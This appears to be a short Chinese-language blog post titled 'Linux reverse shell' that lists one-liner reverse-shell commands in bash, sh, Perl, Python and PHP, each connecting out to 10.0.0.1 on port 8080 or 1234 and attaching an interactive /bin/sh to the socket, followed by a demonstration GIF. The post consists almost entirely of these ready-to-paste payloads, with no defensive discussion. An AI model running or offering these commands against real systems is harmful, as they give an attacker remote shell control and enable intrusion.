---
layout: post
title: Linux 反弹 SHELL 
comments: false
description: ""
keywords: "Tricks"
---

实践几个常用的，分别用bash/sh，perl，python，php来实现；

```
/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

/bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

GIF：

![Linux-1.gif](/assets/images/2016-11-17/2628359055.gif)


[1]: https://www.bodkin.ren/usr/uploads/2017/12/2628359055.gif